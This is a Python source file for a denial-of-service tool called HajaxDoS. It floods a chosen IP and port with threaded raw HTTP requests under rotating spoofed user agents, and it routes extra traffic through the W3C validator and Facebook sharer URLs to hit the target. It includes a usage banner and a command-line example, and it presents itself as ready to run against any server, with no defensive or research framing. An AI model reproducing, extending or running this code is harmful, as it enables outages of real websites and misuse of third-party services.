#python 3 MalconMerlyn Dos Script v.1
# by MalconMerlyn
#!/usr/bin/python3
# -*- coding: utf-8 -*-

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random


def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)")
	uagent.append("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
	uagent.append("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51")
	uagent.append("AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)")
	uagent.append("Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15")
	uagent.append("Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g")
	uagent.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
	uagent.append("Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51")
	uagent.append("BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0")
	uagent.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
	uagent.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
	uagent.append("BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179")
	uagent.append("Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)")
	uagent.append("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.5")
	uagent.append("BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179")
	uagent.append("Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)")
	return(uagent)

# global bots

def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			# Mostra que foi dropado.
			print(" \033[1;32m Conexão \033[1;31mOffline \033[1;37- \033[1;32mAlvo \033[1;31mDerrubado")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				# Pacotes enviados
				print (" \033[1;32m<\033[1;31m-\033[1;32m<\033[1;31m-\033[1;32m<\033[1;31m- \033[1;32mHajaxDoS \033[1;37mEsta \033[1;31mRajando \033[1;37mo Alvo \033[1;31m-\033[1;32m>\033[1;31m-\033[1;32m>\033[1;31m-\033[1;32m>")
			else:
				s.shutdown(1)
				print("Rajado...")
			time.sleep(.1)
	except socket.error as e:
		# Segundo texto de off
		print(" \033[1;32m<\033[1;31m-\033[1;32m+\033[1;31m-\033[1;32m> \033[1;37mConexão sendo \033[1;31mRajada \033[1;32m<\033[1;31m-\033[1;32m+\033[1;31m-\033[1;32m>")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()

# Aqui é o help do script.
def usage():
	print ("")
	print ("  \033[1;31m╦ ╦╔═╗ ╦╔═╗═╗ ╦\033[1;32m╔╦╗╔═╗╔═╗")
	print ("  \033[1;31m╠═╣╠═╣ ║╠═╣╔╩╦╝\033[1;32m ║║║ ║╚═╗")
	print ("  \033[1;31m╩ ╩╩ ╩╚╝╩ ╩╩ ╚═\033[1;32m═╩╝╚═╝╚═╝")
	print ("")
	print (" \033[1;32m+\033[1;31m------------------------\033[1;32m+")
	print (" \033[1;31m|\033[1;32m HajaxDoS\033[1;31m Script Python \033[1;31m|")
	print (" \033[1;31m|\033[1;31m Developed by\033[1;32m MalconDEV \033[1;31m|")
	print (" \033[1;31m|\033[1;31m Script DoS\033[1;32m Termux      \033[1;31m|")
	print (" \033[1;32m+\033[1;31m------------------------\033[1;32m+")
	print ("")
	print (" \033[1;31mComo usar \033[1;37m:")
	print (" \033[1;37m- \033[1;31mHajaxDoS.py -s \033[1;37m[\033[1;32mIP\033[1;37m] \033[1;31m-p \033[1;37m[\033[1;32mPorta\033[1;37m] \033[1;31m-t \033[1;37m[\033[1;32mForça\033[1;37m] ")
	print (" \033[1;31mExemplo \033[1;37m: \033[1;31mhajaxdos.py \033[1;37m-s \033[1;32m1.1.1.1 \033[1;37m-p \033[1;32m80 \033[1;37m-t \033[1;32m135 ")
	print ("")
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# Headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	# varialvel de onde digita
	print("\033[1;31mAlvo: \033[1;32m",host,"\033[1;31mport:","\033[1;32m",str(port),"\033[1;31mturbo:","\033[1;32m",str(thr),"\033[1;32m")
	# Texto de Espere um segundo.
	print("\033[1;32m Aguarde um segundo\033[1;37m...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[1;31mCheque se o 	\033[1;32mIP \033[1;31me a 	\033[1;32mPort \033[1;31mtem resposta!")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.2)
			item = item + 2
			q.put(item)
			w.put(item)
		q.join()
		w.join()
